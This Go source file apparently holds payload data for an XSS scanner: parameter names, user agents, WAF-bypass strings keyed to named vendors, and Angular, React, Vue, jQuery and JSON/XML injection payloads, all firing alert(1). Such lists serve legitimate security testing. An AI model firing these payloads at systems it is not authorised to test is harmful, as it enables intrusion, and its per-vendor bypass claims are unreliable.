package payloads

// CommonParameters contains common parameter names for testing
var CommonParameters = []string{
	"q", "s", "search", "id", "action", "keyword", "query", "page", "keywords",
	"year", "view", "email", "type", "name", "p", "month", "image", "file",
	"url", "terms", "categoryid", "key", "l", "begindate", "enddate", "lang",
	"ref", "a", "u", "t", "i", "return", "redirect", "returnurl", "redirecturl",
	"preview", "page_id", "cat", "dir", "show", "z", "w", "src", "dest", "source",
	"destination", "path", "data", "content", "continue", "document", "path",
	"pg", "style", "pdf", "template", "php_path", "log", "language", "goto",
	"debug", "debug_key", "test", "topic", "title", "mode", "save", "detail",
	"token", "item", "file_name", "filename", "file_id", "target", "folder",
	"prefix", "pass", "passwd", "password", "pwd", "r", "tag", "theme",
	"category", "start", "end", "index", "size", "from", "to", "subj", "subject",
	"msg", "message", "body", "text", "update", "user", "username", "login",
	"logout", "sign", "submit", "ajax", "format", "cmd", "option", "task",
	"status", "state", "cat", "list", "offset", "limit", "sort", "order",
	"orderby", "filter", "fields", "values", "val", "v", "ver", "version",
	"do", "process", "row", "code", "next", "prev", "first", "last", "new",
	"old", "count", "delete", "remove", "reset", "search", "find", "edit",
	"comment", "comments", "rate", "rating", "check", "account", "profile",
	"settings", "author", "description", "desc", "title", "ip", "success_redirect",
	"success_url", "error_redirect", "error_url", "error", "success", "callback",
	"cb", "json", "xml", "html", "htm", "asp", "jsp", "jspa", "aspx", "php",
	"redir", "out", "include", "inc", "print", "post", "get", "date", "day",
	"time", "config", "load", "nav", "site", "site_id", "siteid", "section",
	"module", "step", "class", "host", "sub", "method", "func", "function",
	"op", "operation", "act", "sid", "sess", "session", "sessionid", "lang",
	"locale", "location", "loc", "address", "port", "protocol", "base", "app",
	"service", "services", "object", "objects", "context", "execute", "exec",
	"run", "download", "upload", "welcome", "members", "login", "register",
	"admin", "administrator", "moderator", "manager", "root", "super", "staff",
	"access", "rights", "auth", "authentication", "permission", "role", "roles",
	"grant", "revoke", "allow", "deny", "block", "banned", "ban", "flag",
	"report", "abuse", "spam", "help", "faq", "contact", "about", "info",
	"information", "privacy", "terms", "conditions", "policy", "agreement",
	"confirm", "confirmation", "agree", "subscribe", "unsubscribe", "mail",
	"email", "e-mail", "phone", "mobile", "address", "street", "city", "state",
	"country", "zip", "zipcode", "postal", "code", "region", "district", "area",
	"location", "place", "position", "geo", "map", "latitude", "longitude",
	"coord", "coordinates", "direction", "distance", "remote", "local", "internal",
	"external", "public", "private", "hidden", "visible", "show", "hide",
	"display", "render", "draw", "output", "layout", "design", "style", "css",
	"js", "javascript", "script", "api", "rest", "soap", "wsdl", "xsd", "json",
	"xml", "html", "xhtml", "xslt", "xsl", "rss", "feed", "atom", "media",
	"image", "img", "picture", "photo", "video", "audio", "sound", "music",
	"voice", "record", "recording", "play", "stop", "pause", "volume", "mute",
	"unmute", "start", "end", "duration", "length", "width", "height", "size",
	"resize", "scale", "zoom", "color", "background", "foreground", "font",
	"text", "align", "left", "right", "center", "top", "bottom", "middle",
	"header", "footer", "sidebar", "menu", "navigation", "nav", "toolbar",
	"statusbar", "frame", "iframe", "window", "dialog", "popup", "modal",
	"alert", "confirm", "prompt", "message", "notification", "warning", "error",
	"info", "success", "fail", "failure", "ok", "cancel", "yes", "no", "on",
	"off", "enable", "disable", "active", "inactive", "valid", "invalid",
	"correct", "incorrect", "true", "false", "null", "nil", "empty", "full",
	"open", "close", "closed", "lock", "unlock", "secure", "insecure", "safe",
	"unsafe", "clean", "dirty", "new", "old", "young", "senior", "junior",
	"fresh", "stale", "hot", "cold", "warm", "cool", "high", "low", "up",
	"down", "in", "out", "inside", "outside", "internal", "external", "domestic",
	"foreign", "native", "alien", "friend", "enemy", "ally", "foe", "partner",
}

// UserAgents contains common user agents for testing
var UserAgents = []string{
	"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
	"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.159 Safari/537.36",
	"Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:90.0) Gecko/20100101 Firefox/90.0",
	"Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:91.0) Gecko/20100101 Firefox/91.0",
	"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36 Edg/91.0.864.59",
	"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.159 Safari/537.36 Edg/92.0.902.78",
	"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.1.2 Safari/605.1.15",
	"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.114 Safari/537.36",
	"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.159 Safari/537.36",
	"Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:90.0) Gecko/20100101 Firefox/90.0",
	"Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:91.0) Gecko/20100101 Firefox/91.0",
	"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.114 Safari/537.36",
	"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.159 Safari/537.36",
	"Mozilla/5.0 (X11; Linux x86_64; rv:90.0) Gecko/20100101 Firefox/90.0",
	"Mozilla/5.0 (X11; Linux x86_64; rv:91.0) Gecko/20100101 Firefox/91.0",
}

// HTTPMethods contains common HTTP methods for testing
var HTTPMethods = []string{
	"GET",
	"POST",
	"PUT",
	"DELETE",
	"HEAD",
	"OPTIONS",
	"PATCH",
	"TRACE",
}

// WAFBypassPayloads contains payloads for bypassing Web Application Firewalls
var WAFBypassPayloads = map[string]string{
	"CloudFlare":  "<svg onload=alert(1)>",
	"ModSecurity": "<img src=x onerror=alert(1)>",
	"Imperva":     "javascript:alert(1)",
	"F5 BIG-IP":   "<body onload=alert(1)>",
	"Akamai":      "<script>alert(1)</script>",
}

// FrameworkPayloads contains payloads for specific JavaScript frameworks
var FrameworkPayloads = map[string][]string{
	"Angular": {
		"{{constructor.constructor('alert(1)')()}}",
		"{{$eval('alert(1)')}}",
		"{{$on.constructor('alert(1)')()}}",
		"<div ng-app ng-csp>{{$eval.constructor('alert(1)')()}}</div>",
		"<div ng-app>{{constructor.constructor('alert(1)')()}}</div>",
	},
	"React": {
		"<img src=x onError={(e)=>{alert(1)}} />",
		"<img src=x onError={alert(1)} />",
		"<a href=\"javascript:alert(1)\">Click me</a>",
		"<div dangerouslySetInnerHTML={{__html: '<img src=x onerror=alert(1)>'}}></div>",
	},
	"Vue": {
		"<div v-html=\"'<img src=x onerror=alert(1)>'\"></div>",
		"<svg><a v-bind:href=\"'javascript:alert(1)'\"><circle r=100></circle></a></svg>",
	},
	"jQuery": {
		"<img src=x onerror=\"$(document).ready(function(){alert(1)})\">",
		"<img src=x onerror=\"$.getScript('data:text/javascript,alert(1)')\">",
		"<iframe srcdoc=\"<script>$('body').append('<img src=x onerror=alert(1)>')</script>\"></iframe>",
	},
}

// ContentTypePayloads contains payloads for specific content types
var ContentTypePayloads = map[string][]string{
	"application/json": {
		"\",\"vulnerable\":\"<script>alert(1)</script>\",\"",
		"\",\"vulnerable\":\"<img src=x onerror=alert(1)>\",\"",
		"\",\"vulnerable\":\"</script><script>alert(1)</script>\",\"",
		"\",\"vulnerable\":\"\\u003cscript\\u003ealert(1)\\u003c/script\\u003e\",\"",
	},
	"application/xml": {
		"<test><![CDATA[<script>alert(1)</script>]]></test>",
		"<test><![CDATA[<img src=x onerror=alert(1)>]]></test>",
		"<?xml version=\"1.0\"?><test><script xmlns=\"http://www.w3.org/1999/xhtml\">alert(1)</script></test>",
	},
	"text/html": {
		"<script>alert(1)</script>",
		"<img src=x onerror=alert(1)>",
		"<svg onload=alert(1)>",
	},
	"text/plain": {
		"<script>alert(1)</script>",
		"<img src=x onerror=alert(1)>",
		"<svg onload=alert(1)>",
	},
}
